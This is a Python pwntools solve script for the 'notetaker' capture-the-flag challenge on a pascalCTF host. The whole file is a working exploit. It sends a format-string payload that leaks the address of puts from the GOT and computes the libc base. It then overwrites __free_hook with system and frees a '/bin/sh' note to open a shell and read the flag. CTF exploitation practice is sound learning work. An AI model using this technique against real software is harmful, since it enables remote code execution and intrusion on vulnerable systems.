import re
from pwn import context, remote, ELF, p64, u64, fmtstr_payload

def get_flag(data: str, prefix: str) -> str:
    return next(iter(re.findall(rf"{prefix}\{{.*?\}}", data)), "")

def solution(host: str, port: str, prefix: str) -> str:
    context.update({"arch":"amd64", "log_level":"error"})
    e = ELF("./notetaker", checksec = False)
    libc = ELF("./libs/libc.so.6", checksec = False)
    got_puts = e.got["puts"]
    with remote(host, port) as rem:
        rem.sendlineafter(b"> ", b"2")
        rem.sendlineafter(b"Enter the note: ", b"%9$s" + b"AAAA" + p64(got_puts))
        rem.sendlineafter(b"> ", b"1")

        leak_data = rem.recvuntil(b"AAAA", drop = True)
        leak_data = leak_data[-6:]
        leak_address = u64(leak_data.ljust(8, b"\x00"))

        libc.address = leak_address - libc.symbols["puts"]
        system_address = libc.symbols["system"]
        free_hook = libc.symbols["__free_hook"]

        overwrite_payload = fmtstr_payload(8, {free_hook: system_address}, write_size = "byte")
        rem.sendlineafter(b"> ", b"2")
        rem.sendlineafter(b"Enter the note: ", overwrite_payload)
        rem.sendlineafter(b"> ", b"1") 

        rem.sendlineafter(b"> ", b"2")
        rem.sendlineafter(b"note: ", b"/bin/sh")
        rem.sendline(b"cat flag")
        flag = get_flag(rem.recvall(timeout = 2).strip().decode(), prefix)
    return flag

if __name__ == "__main__":
    host = "notetaker.ctf.pascalctf.it"
    port = "9002"
    prefix = "pascalCTF"
    print(solution(host, port, prefix))
    